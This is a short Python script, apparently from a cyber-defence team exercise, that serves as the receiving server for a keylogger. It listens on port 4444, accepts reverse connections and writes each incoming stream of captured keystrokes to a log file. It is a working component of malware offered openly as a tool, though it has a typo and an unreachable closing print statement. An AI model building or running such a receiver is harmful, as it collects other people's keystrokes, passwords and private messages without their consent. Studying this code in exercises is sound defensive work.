#!/usr/bin/python
# Python Keylogger Tool: Reverse Cnnection Receiver
# Author: Finn Cappelli
# CDT Team Echo, Spring 2025

import socket

HOST = '0.0.0.0'
PORT = 4444
LOG_FILE = 'log.txt'

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)
    print(f"Listening for reverse connections on {HOST}:{PORT}...")
    
    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Connection from {client_address} established.")
        
        with client_socket:
            with open(LOG_FILE, 'a') as log_file:
                while True:
                    data = client_socket.recv(1024)
                    if not data:
                        break
                    log_file.write(data.decode('utf-8'))
                    log_file.flush()
                    print("Received data:", data.decode('utf-8').strip())
    print(f"Connection from {client_address} closed.")
